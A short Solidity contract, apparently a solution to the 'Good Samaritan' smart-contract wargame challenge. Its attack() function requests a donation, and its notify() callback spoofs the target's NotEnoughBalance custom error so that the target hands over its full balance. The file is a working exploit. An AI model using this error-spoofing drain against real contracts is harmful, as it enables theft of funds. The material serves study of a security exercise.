// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./GoodSamaritan.sol";

contract GoodSamaritanAttack is Ownable {
    GoodSamaritan public goodSamaritan;
    address public coinAddress;

    error NotEnoughBalance();

    constructor(address addr1, address addr2) {
        goodSamaritan = GoodSamaritan(addr1);
        coinAddress = addr2;
    }

    function attack() external onlyOwner {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external view {
        if (msg.sender != coinAddress) revert();

        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
